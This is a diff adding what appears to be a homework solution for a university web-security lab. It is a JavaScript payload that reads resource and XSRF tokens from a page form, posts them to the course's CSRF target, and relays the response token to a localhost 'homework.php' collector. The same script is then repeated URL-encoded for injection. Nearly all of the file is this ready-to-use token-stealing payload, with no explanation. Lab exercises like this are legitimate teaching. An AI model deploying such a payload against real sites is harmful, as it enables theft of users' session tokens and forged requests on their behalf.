@@ -1,0 +1,26 @@
+<script>
+    var resourceToken = document.forms[0].elements[0].value
+    var xsrfToken = document.forms[0].elements[1].value
+
+    var request = new XMLHttpRequest()
+
+    request.onreadystatechange = function() {
+        if (request.readyState == 4 && request.status == 200) {
+            var request2 = new XMLHttpRequest()
+            request2.open('POST', 'http://localhost/csrf/homework.php?token='+request.responseText, true)
+            request2.send()
+        }
+    }
+
+    request.open('POST', 'https://webappsec.cs.ut.ee/csrf/', true)
+
+    request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
+
+    request.send('resourceToken=' + resourceToken + '&xsrfToken=' + xsrfToken)
+
+</script>
+
+
+using https://meyerweb.com/eric/tools/dencoder/, the above is encoded as:
+
+%3Cscript%3E%0A%20%20%20%20var%20resourceToken%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%0A%20%20%20%20var%20xsrfToken%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%0A%0A%20%20%20%20var%20request%20%3D%20new%20XMLHttpRequest()%0A%0A%20%20%20%20request.onreadystatechange%20%3D%20function()%20%7B%0A%20%20%20%20%20%20%20%20if%20(request.readyState%20%3D%3D%204%20%26%26%20request.status%20%3D%3D%20200)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20request2%20%3D%20new%20XMLHttpRequest()%0A%20%20%20%20%20%20%20%20%20%20%20%20request2.open(%27POST%27%2C%20%27http%3A%2F%2Flocalhost%2Fcsrf%2Fhomework.php%3Ftoken%3D%27%2Brequest.responseText%2C%20true)%0A%20%20%20%20%20%20%20%20%20%20%20%20request2.send()%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20request.open(%27POST%27%2C%20%27https%3A%2F%2Fwebappsec.cs.ut.ee%2Fcsrf%2F%27%2C%20true)%0A%0A%20%20%20%20request.setRequestHeader(%27Content-Type%27%2C%20%27application%2Fx-www-form-urlencoded%27)%0A%0A%20%20%20%20request.send(%27resourceToken%3D%27%20%2B%20resourceToken%20%2B%20%27%26xsrfToken%3D%27%20%2B%20xsrfToken)%0A%0A%3C%2Fscript%3E
